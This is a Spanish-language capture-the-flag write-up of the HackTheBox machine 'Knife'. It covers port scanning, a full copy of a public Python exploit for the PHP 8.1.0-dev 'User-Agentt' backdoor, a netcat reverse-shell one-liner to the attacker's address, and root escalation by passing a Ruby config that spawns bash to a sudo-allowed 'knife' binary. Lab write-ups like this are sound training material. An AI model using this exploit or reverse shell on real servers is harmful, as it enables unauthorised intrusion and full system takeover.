---
title: HTB - Knife
published: true
---

![Knife](assets/knife.jpeg)<!--{:width="800px" width="1000px"}-->
[Sitio Oficial de la maquina](https://app.hackthebox.eu/machines/Knife)

Knife es una maquina retirada de HackTheBox 

# [](#header-1)Enumeracion
Lanzamos un nmap para descubrir los puertos abiertos
```bash
nmap -sC -sV -sS -p- --open --min-rate 5000 -Pn -oA target 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  9 12:01:55 2021 -- 1 IP address (1 host up) scanned in 26.67 seconds
```
#### [](#header-4)Comandos utilizados
>`-sC:` serie basicos de scripts
>
>`-sV:` para detectar el servicio/version del puerto
>
>`-sS:` TCP SYNK port scan, se envían solo paquetes de tipo SYN (inicio de conexión) y mediante el tipo de respuesta RST/ACK (no existe)o SYN/ACK (si existe) determina si esta corriendo algún servicio en el puerto
>
>`-p- --open:` para que reporte los puertos con estado abierto
>
>`--min-rate 500:` para que envie paquetes N paquetes por segundo, esto hace mas rapido el escaneo
>
>`-Pn:` indicamos que no realice reconocimiento de host
>
>`-oA:` exportamos la informacion en todos los formatos, en caso que quieras hacer un reporte mas detallado

Tenemos dos puertos 22 y 80, antes de ir directamente al sitio a investigar vamos a lanzar un whatweb para ver a que nos enfrentamos 

```lua
whatweb http://10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5,
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Informacion relevante <span style="color:yellow">**Apache[2.4.41]** **PHP[8.1.0-dev]**</span>

Agregamos la direccion del equipo al <span style="color:green">/etc/hosts</span> esto realmente no siempre es necesario pero en mi experiencia es recomendable para no omitir nada del sitio. Con el comando `sudo vim /etc/hosts` agregamos la linea `10.10.10.242 knife.htb` quedando el archivo de la siguiente manera
```bash
# Host addresses
127.0.0.1  localhost
10.10.10.242 knife.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
```
Ingresamos al sitio para ver de que se trata

![Web-Site](assets/knife_site.jpg)

Despues de varias vueltas por el sitio, revisando el codigo fuente `ctrl + u` mirando los archivos `.js` no encontre nada util

# [](#header-2)Explotacion

Volviendo a lo que habiamos encontrado con `whatweb` vamos a buscar algun exploit para <span style="color:yellow">**PHP [8.1.0-dev]**</span>

![PHP_8.1.0-dev](assets/PHP_8.1.0-dev.jpg)

Ingresamos al primer enlace y leemos el exploit para entender como utilizarlo, bueno eso seria lo idea ya que estamos aprendiendo, peeero tambien podemos descargarlo darle privilegios de ejecucion y utilizarlo directamente xD

Obtenemos el exploit 49933.py

```python
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, 
but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an 
attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Una vez que entendemos como funciona el script es hora de utilizarlo, damos permiso de ejecucion al archivo con `chmod +x 49933.py` y ejecutamos

```bash
python3 49933.py                  
Enter the full host url:
http://knife.htb/

Interactive shell is opened on http://knife.htb/ 
Can't acces tty; job crontol turned off.
$ whoami
james

$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var 

```

![YEES!](assets/tenor.gif){:width="60px"} Obtenemos acceso al equipo!!

Ya que podemos ejecutar comandos desde la terminar, para que sea mas comodo a la hora de explorar los ficheros vamos a entablarnos una reverse shell y hacer un tratamiento de la <span style="color:red">tty</span> para obtener una terminal interactiva y poder utilizar los comados `ctrl + l` o `ctrl + c` y el autocompletado(<span style="color:red">!!</span>). 

#### [](#header-4)Reverse Shell

En la sesion que ganamos acceso a la maquina ejecutamos
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.25 4242 >/tmp/f
```

> Adecuamos el comando ingresando la direccion de nuestra maquina `10.10.15.25` y el puerto de escucha `4242`

En otra ventana en nuestra maquina de atacante vamos a ponernos en escucha en el puerto `4242`

```bash
nc -lvnp 4242
```

#### [](#header-4)Tratamiento de la tty

Una vez que tengamos la reverse shell procedemos a ejecutar

![stty](assets/stty.jpg)

Por ultimo exportamos el emulador de la terminal, la shell y adecuamos para que cuadre con la proporcion de la pantalla de nuestra maquina

```bash
james@knife:/$ export TERM=xterm
james@knife:/$ export SHELL=bash
james@knife:/$ stty rows 45 columns 125
```

Para mi caso las filas valen 45 y las columnas 125, para identificar cuales son las proporciones de tu pantalla podrias ejecutar

```bash
stty -a           
speed 38400 baud; rows 45; columns 125; line = 0;

```

Ya podemos leer la flag del usuario 

```bash
james@knife:/$ cat /home/james/user.txt 
66bb684b17cf200e47438d902018558e
james@knife:/$ 

```

# [](#header-1)Escalada de privilegios

En este punto podriamos aprovecharnos de scripts automatizados como linpeas, pero vamos por lo basico...

```bash
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:/$
```

Ahaaaa podemos ejecutar el archivo `/usr/bin/knife` como root sin proporcinar nuestra contrasenha de usuario `james`, pues a probarlo

```bash
james@knife:~$ sudo knife
ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)

Usage: knife sub-command (options)
    -s, --server-url URL             Chef Infra Server URL.
        --chef-zero-host HOST        Host to start Chef Infra Zero on.
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
    -k, --key KEY                    Chef Infra Server API client key.
        --[no-]color                 Use colored output, defaults to enabled.
    -c, --config CONFIG              The configuration file to use.
        --config-option OPTION=VALUE Override a single configuration option.
        --defaults                   Accept default values for all questions.
    -d, --disable-editing            Do not open EDITOR, just accept the data as is.
    -e, --editor EDITOR              Set the editor to use for interactive commands.
    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
        --[no-]fips                  Enable FIPS mode.
    -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
        --[no-]listen                Whether a local mode (-z) server binds to a port.
    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.
    -u, --user USER                  Chef Infra Server API client username.
        --print-after                Show the data after a destructive operation.
        --profile PROFILE            The credentials profile to select.
    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
    -v, --version                    Show Chef Infra Client version.
    -y, --yes                        Say yes to all prompts for confirmation.
    -h, --help                       Show this help message.
```

Una busqueda rapida para entender a que nos enfrentamos y encontre el siguiente link

[knife_setup](https://docs.chef.io/workstation/knife_setup/)

con el comando `-c` podemos indicarle la ruta del archivo de configuracion, procedemos a crear un archivo en el directorio `/home/james` quedando de la siguiente manera

```bash
james@knife:~$ cat expl.rb 
exec "/bin/bash -i"
```

Con esto solo nos queda ejecutar el comando

```bash
james@knife:~$ sudo knife user list -c expl.rb 
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/home/james# cat /root/root.txt
94fb18c7c7913defff161e6181f399d4
root@knife:/home/james# 
```

Y tenemos acceso root y podemos leer la flag!!
![](assets/celebdark.gif)


Espero que esta guia haya sido de ayuda para tu aprendizaje, estare subiendo mas writeups en los proximos dias :D
